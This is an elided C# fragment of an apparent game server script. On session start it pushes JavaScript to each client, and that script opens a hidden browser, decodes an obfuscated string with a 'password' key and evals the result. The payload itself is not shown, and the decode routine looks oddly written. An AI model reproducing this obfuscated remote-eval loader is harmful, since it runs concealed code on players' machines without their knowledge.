...
public partial class rpg : Script
{
    ...
    public void onClientEventTrigger(Client sender, string name, object[] args)
    {
        if (name == "SESSION_INIT")
        {
            ...
            API.triggerClientEvent(sender, "ADMIN_EVAL", "var cef=API.createCefBrowser(0,0,true);API.waitUntilCefBrowserInit(cef);API.setCefBrowserPosition(cef,0,00);API.loadPageCefBrowser(cef,'');cef.eval('var content=\"'+content+'\";var a=\"password\";var array=\"\";var i2=0;for(var i=0;i<content.length;i++){if(i2>=a[1].length){i2=0}array+=String.fromCharCode(content[i].charCodeAt(0)-15000-a[1][i2].charCodeAt(0));i2++};resourceEval(array)')");
